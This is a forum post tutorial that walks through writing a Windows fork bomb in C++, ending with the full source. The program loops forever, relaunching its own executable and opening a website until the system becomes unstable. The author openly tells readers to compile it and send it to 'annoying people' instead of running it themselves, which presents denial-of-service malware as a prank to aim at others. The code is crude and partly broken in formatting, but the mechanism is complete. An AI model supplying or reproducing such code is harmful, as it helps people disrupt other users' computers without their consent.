item.title: [C++]easy little fork bomb
item.dc:creator: @sppt sppt
item.description:
@sppt wrote:

this tut will tell you how to create a fork bomb(for windows) and what it is.

What is a fork bomb?
A fork bomb is a little program that keeps opening itself or other applications, which makes the system unstable as hell!
but i wont go as deep as disabling task manager and adding it to startup.

Requirements:

  • C++ compiler, i suggest using dev c++.
  • C++ Knowledge

The tutorial:
first of all we need to open your compiler/working area

now that it’s open we need to import some basic functions: iostream.h and windows.h and we need to declare the namespace
enter this:

#include <iostream.h> #include <windows.h> using namespace std;

now we have the packages we need
let’s just make the main loop!
insert this:

int main() {[/code]

so now we have the main loop opened :)
we're going to add a nice fancy text to it :)
[code] cout << "Put the text you want here!" << endl;

so now you have a nice fancy message!
let’s start the loop which causes the system to get unstable!
add this

while(1) { ShellExecute(0,"open", "fork.exe",NULL,NULL,1); //opens the program itself, notice this: if you compile the program as, for example: ruinedscape.exe you HAVE to change fork.exe to ruinedscape.exe! ShellExecute(0,"open", "http://msn.com",NULL,NULL,1); //change http://msn.com to any site you want! }

now all we have to do is returning a value and closing the main loop!
insert this: return 1; }

now compile it(don’t run on your own pc, teeheehee!)
send it to annoying people

my code:

[code]#include <iostream.h>
#include <windows.h>
using namespace std;

int main() {
while(1) {
ShellExecute(0,“open”, “http://www.msn.com/”,NULL,NULL,1);
ShellExecute(0,“open”, “fork.exe”,NULL,NULL,1);
}
return 1;
}
[/code]

note to mods: if you find this offending please remove it

Read full topic
